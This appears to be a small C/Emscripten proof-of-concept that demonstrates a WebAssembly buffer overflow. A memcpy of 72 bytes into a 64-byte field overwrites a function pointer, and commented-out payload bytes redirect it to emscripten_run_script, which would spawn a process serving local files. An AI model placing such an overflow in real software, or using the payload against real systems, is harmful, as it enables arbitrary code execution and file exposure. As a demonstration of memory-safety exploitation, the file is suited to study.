#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include <emscripten.h>

/* Represents a message and an output channel */
typedef struct Comms {
  char msg[64];
  uint16_t msg_len;
  void (*out)(const char *);
} Comms;

/* Conduct the communication by calling the function pointer with message. */
void trigger(Comms *comms) {
  printf("%s", comms->msg);
  comms->out(comms->msg);
}

void communicate(const char *msg) {
  printf("%s", msg);
}

EMSCRIPTEN_KEEPALIVE
void sup(char *msg) {
  Comms comms;
  comms.out = &communicate;

  printf("&communicate: %p\n", &communicate); // 0x4
  printf("&emscripten_run_script: %p\n", &emscripten_run_script); // 0x5
  // char *payload = "require('child_process').spawn('npx', ['serve', './']);//" // 57 bytes
  // "       " // + 7 to fill .msg = 64
  // "  " // + 2 for alignment = 66
  // "\x40\x00" // + 2 bytes to fill .msg_len = 68
  // "\x05\x00\x00\x00"; // + 4 bytes to overwrite .out= 72

  // printf("%s\n", msg);

  memcpy(comms.msg, msg, 72);

  trigger(&comms);

  return;
}
